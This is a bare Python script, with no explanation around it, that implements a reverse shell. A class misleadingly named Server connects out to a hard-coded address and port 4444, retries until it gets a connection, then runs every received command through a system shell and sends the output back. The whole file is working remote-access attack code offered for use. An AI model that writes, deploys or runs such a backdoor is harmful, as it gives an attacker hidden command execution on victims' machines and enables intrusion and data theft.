import socket
import subprocess
import time
import json


class Server:
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def connect(self):
        while True:
            time.sleep(2)
            try:
                self.server.connect((self.ip, self.port))
                print("serene self connected")
                self.receive_commands_and_execute()
                break
            except Exception:
                self.connect()

    def receive_commands_and_execute(self):
        while True:
            try:
                receive = self.reliable_receive()
                split_command = receive.split()
                if split_command[0] == "quit":
                    self.server.close()
                    exit()
                else:
                    result = self.execute_command_on_system(receive)
                    self.reliable_send(result)
            except Exception:
                self.reliable_send("We encountered an error.")

    def execute_command_on_system(self, command):
        execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        result = execute.stdout.read() + execute.stderr.read()
        result = result.decode()
        return result

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.server.send(json_data.encode())

    def reliable_receive(self):
        data = ''
        while True:
            try:
                data = data + self.server.recv(1024).decode().rstrip()
                return json.loads(data)
            except ValueError:
                continue


server = Server('0.0.0.0', 4444)
server.connect()
